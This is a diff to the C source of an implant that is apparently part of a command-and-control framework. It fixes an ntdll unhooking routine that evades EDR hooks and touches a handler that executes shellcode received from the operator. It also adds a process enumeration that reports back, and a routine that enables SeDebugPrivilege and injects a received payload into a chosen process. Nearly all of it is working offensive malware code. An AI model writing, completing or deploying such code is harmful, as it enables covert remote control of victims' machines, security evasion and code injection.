@@ -3,6 +3,8 @@
 #include<TlHelp32.h>
 #include<Psapi.h>
 
+#include "ztap.h"
+
 #include "../transport/transport.h"
 #include "../ctrl.h"
 #include "jobs.h"
@@ -567,16 +569,14 @@ int implant_unhookbyon(struct wrkr_trans_t* trans, struct unhookbyon_req_t* req)
     dos_header = (PIMAGE_DOS_HEADER)ntdll_base;
 
     PIMAGE_NT_HEADERS nt_headers;
-    nt_headers = (PIMAGE_NT_HEADERS)(
-        (DWORD_PTR)ntdll_base + dos_header->e_lfanew
-        );
+    nt_headers = (PIMAGE_NT_HEADERS)
+        ((DWORD_PTR)ntdll_base + dos_header->e_lfanew);
 
     for (uint16_t i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
         PIMAGE_SECTION_HEADER section_header;
         section_header = (PIMAGE_SECTION_HEADER)(
             (DWORD_PTR)IMAGE_FIRST_SECTION(nt_headers) +
-            ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i)
-            );
+            ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
 
         if (strncmp(section_header->Name, ".text", 5)) continue;
 
@@ -584,16 +584,16 @@ int implant_unhookbyon(struct wrkr_trans_t* trans, struct unhookbyon_req_t* req)
         uint32_t old_protection;
         uint32_t size_of_text;
 
-        DWORD* uploaded_text_section;
-        DWORD* running_text_section;
+        char* uploaded_text_section;
+        char* running_text_section;
 
         size_of_text = section_header->Misc.VirtualSize;
 
-        running_text_section = (DWORD*)ntdll_base +
-            section_header->VirtualAddress;
+        running_text_section = (char*)((uintptr_t)ntdll_base +
+            section_header->VirtualAddress);
 
-        uploaded_text_section = (DWORD*)ntdll_buf +
-            section_header->VirtualAddress;
+        uploaded_text_section = (char*)((uintptr_t)ntdll_buf +
+            section_header->PointerToRawData);
 
         is_protected = VirtualProtect(
             running_text_section,
@@ -617,9 +617,9 @@ int implant_unhookbyon(struct wrkr_trans_t* trans, struct unhookbyon_req_t* req)
     free(ntdll_buf);
 
     memset(&msg, 0, sizeof(msg));
-    msg.msg_enum = UNHOOK_L;
-    msg.upload.msg_enum = FIN;
-    msg.upload.fin.sanity = 1;
+    msg.msg_enum = UNHOOK_BYON;
+    msg.unhookbyon.msg_enum = FIN;
+    msg.unhookbyon.fin.sanity = 1;
 
     tremont_send(trans->stream_id, (byte*)&msg,
         sizeof(msg), trans->nexus);
@@ -638,9 +638,9 @@ int implant_runcode(struct wrkr_trans_t* trans, struct runcode_req_t* req) {
     tremont_stream_id stream = trans->stream_id;
 
     struct wrkr_msg_t msg;
-    msg.msg_enum = UNHOOK_BYON;
-    msg.upload.msg_enum = RES;
-    msg.upload.res.allowed = 1;
+    msg.msg_enum = RUN_CODE;
+    msg.runcode.msg_enum = RES;
+    msg.runcode.res.allowed = 1;
 
     tremont_send(stream, (byte*)&msg,
         sizeof(msg), nexus);
@@ -676,12 +676,159 @@ int implant_runcode(struct wrkr_trans_t* trans, struct runcode_req_t* req) {
 
     ((void(*)())(shellcode_buf))(); //my favorite thing in all of C
 
-    VirtualFree(shellcode_buf, total_size, MEM_RELEASE);
+    VirtualFree(shellcode_buf, 0, MEM_RELEASE);
 
     memset(&msg, 0, sizeof(msg));
-    msg.msg_enum = UNHOOK_L;
-    msg.upload.msg_enum = FIN;
-    msg.upload.fin.sanity = 1;
+    msg.msg_enum = RUN_CODE;
+    msg.runcode.msg_enum = FIN;
+    msg.runcode.fin.sanity = 1;
+
+    tremont_send(trans->stream_id, (byte*)&msg,
+        sizeof(msg), trans->nexus);
+
+    memset(&msg, 0, sizeof(msg));
+    tremont_recv(trans->stream_id, (byte*)&msg,
+        sizeof(msg), trans->nexus);
+
+    tremont_end_stream(trans->stream_id, trans->nexus);
+
+    return 0;
+}
+
+#undef UNICODE
+
+struct _pst32_proc_t {
+    uint32_t proc_id;
+    wchar_t exe_name[255];
+};
+
+int implant_pst32(struct wrkr_trans_t* trans, struct pst32_req_t* req) {
+    struct wrkr_msg_t msg;
+
+    Tremont_Nexus* nexus = trans->nexus;
+    tremont_stream_id stream = trans->stream_id;
+
+    uint32_t proc_count;
+    BOOL can_enum;
+    PROCESSENTRY32 entry;
+    HANDLE snapshot_handle;
+    struct _pst32_proc_t* procs;
+
+    proc_count = 0;
+    procs = calloc(1, sizeof(*procs));
+    entry.dwSize = sizeof(entry);
+    snapshot_handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+    msg.msg_enum = PS_T32;
+    msg.pst32.msg_enum = RES;
+
+    can_enum = Process32First(snapshot_handle, &entry);
+    if (!can_enum) msg.pst32.res.proc_count = 0;
+    else {
+        proc_count = 1;
+        do {
+            procs[proc_count - 1].proc_id = entry.th32ProcessID;
+            wcsncpy_s(procs[proc_count - 1].exe_name, 254,
+                entry.szExeFile, 254);
+
+            procs = realloc(procs, sizeof(*procs) * ++proc_count);
+        } while (Process32Next(snapshot_handle, &entry));
+
+        msg.pst32.res.proc_count = --proc_count;
+    }
+
+    tremont_send(stream, (byte*)&msg,
+        sizeof(msg), nexus);
+
+    tremont_send(stream, (byte*)procs,
+        sizeof(*procs) * proc_count, trans->nexus);
+    
+    free(procs);
+
+    memset(&msg, 0, sizeof(msg));
+    msg.msg_enum = PS_T32;
+    msg.runcode.msg_enum = FIN;
+    msg.runcode.fin.sanity = 1;
+
+    tremont_send(trans->stream_id, (byte*)&msg,
+        sizeof(msg), trans->nexus);
+
+    memset(&msg, 0, sizeof(msg));
+    tremont_recv(trans->stream_id, (byte*)&msg,
+        sizeof(msg), trans->nexus);
+
+    tremont_end_stream(trans->stream_id, trans->nexus);
+
+    return 0;
+}
+
+int implant_inject(struct wrkr_trans_t* trans, struct inject_req_t* req) {
+    Tremont_Nexus* nexus = trans->nexus;
+    tremont_stream_id stream = trans->stream_id;
+
+    struct wrkr_msg_t msg;
+    msg.msg_enum = INJECT;
+    msg.runcode.msg_enum = RES;
+    msg.runcode.res.allowed = 1;
+
+    TOKEN_PRIVILEGES priv;
+    HANDLE token;
+    memset(&priv, 0, sizeof(priv));
+    token = NULL;
+
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
+        priv.PrivilegeCount = 1;
+        priv.Privileges->Attributes = SE_PRIVILEGE_ENABLED;
+
+        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
+            AdjustTokenPrivileges(token, FALSE, &priv, 0, NULL, NULL);
+
+        CloseHandle(token);
+    }
+    else msg.runcode.res.allowed = 0;
+
+    tremont_send(stream, (byte*)&msg,
+        sizeof(msg), nexus);
+
+    int64_t total_recvd = 0;
+    int64_t total_size = req->file_len;
+
+    int recvd = 0;
+    int written = 0;
+    char temp_buf[255];
+
+    tremont_opts_stream(stream, OPT_NONBLOCK, 1, nexus);
+
+    char* buf;
+    buf = calloc(1, total_size);
+
+    while (total_recvd < total_size) {
+        recvd = tremont_recv(stream,
+            (byte*)temp_buf, sizeof(temp_buf), nexus);
+        memcpy(buf + total_recvd, temp_buf, recvd);
+        total_recvd += recvd;
+    }
+
+    tremont_opts_stream(stream, OPT_NONBLOCK, 0, nexus);
+
+    memset(&msg, 0, sizeof(msg));
+    msg.msg_enum = INJECT;
+    msg.inject.msg_enum = RES;
+    msg.inject.res.allowed = 1;
+
+    tremont_send(stream, (byte*)&msg, sizeof(msg), nexus);
+
+    HANDLE proc_handle;
+    proc_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, req->pid);
+    ztap_buff(proc_handle, buf, total_size);
+    CloseHandle(proc_handle);
+
+    free(buf);
+
+    memset(&msg, 0, sizeof(msg));
+    msg.msg_enum = INJECT;
+    msg.runcode.msg_enum = FIN;
+    msg.runcode.fin.sanity = 1;
 
     tremont_send(trans->stream_id, (byte*)&msg,
         sizeof(msg), trans->nexus);
